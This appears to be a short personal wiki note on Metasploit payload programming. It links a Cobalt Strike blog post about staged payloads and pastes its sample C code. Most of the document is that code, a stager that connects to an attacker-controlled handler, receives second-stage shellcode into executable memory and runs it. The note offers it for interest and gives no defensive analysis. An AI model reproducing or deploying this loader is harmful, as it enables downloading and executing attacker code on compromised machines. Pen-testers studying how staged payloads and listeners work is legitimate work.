<!-- TITLE: Metasploitprogramming -->
<!-- SUBTITLE: A quick summary of Metasploitprogramming -->

# C++ Payload stuff
https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/

Talks about how a listener works.  Has sample code.  Pasting in sample code because it's cool and I don't want to lose it.

```text
/* connect to the handler */
SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));
 
/* read the 4-byte length */
int count = recv(my_socket, (char *)&size, 4, 0);
if (count != 4 || size <= 0)     punt(my_socket, "read a strange or incomplete length value\n"); 

/* allocate a RWX buffer */ 
buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 

if (buffer == NULL)     punt(my_socket, "could not allocate buffer\n"); 

/* prepend a little assembly to move our SOCKET value to the EDI register    
thanks mihi for pointing this out    
BF 78 56 34 12     =>      mov edi, 0x12345678 */

buffer[0] = 0xBF;
 
/* copy the value of our socket to the buffer */
memcpy(buffer + 1, &my_socket, 4);
 
/* read bytes into the buffer */
count = recv_all(my_socket, buffer + 5, size);
 
/* cast our buffer as a function and call it */
function = (void (*)())buffer;
function();
```

